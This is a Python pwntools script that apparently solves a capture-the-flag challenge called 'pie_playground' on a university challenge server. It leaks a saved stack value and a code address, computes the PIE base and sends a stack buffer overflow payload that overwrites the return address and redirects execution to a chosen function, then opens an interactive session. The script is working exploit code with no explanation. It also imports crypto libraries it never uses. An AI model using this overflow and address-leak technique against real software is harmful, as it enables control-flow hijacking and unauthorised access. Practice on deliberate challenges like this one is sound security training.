from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.number import long_to_bytes, bytes_to_long
import string
import math

elf = ELF('./pie_playground')
p = elf.process()
p = remote("cyberchallenge.diag.uniroma1.it", 5055)

p.send(b'A'*(32-8) + b'B'*7 + b'C')
junk = p.recvuntil(b'C')
base_address = p.recvline()[:-1]
print("base address:", base_address)
junk = p.recvuntil(b'address is: ')
readdr = p.recvline()[:-1]
junk = p.recvuntil(b'sussy address: ')
sussy_addr = p.recvline()[:-1]
print("printo junk")
print(junk)
print("retaddr: ", readdr)
print("sussy_addr: ", sussy_addr)
pie = int(sussy_addr, 16) - 0x1266
print(pie)
payload = (b'A'* 32) + base_address.ljust(8,b"\x00") + p64(pie + 0x1209)
print(payload)
p.send(payload)

p.interactive()
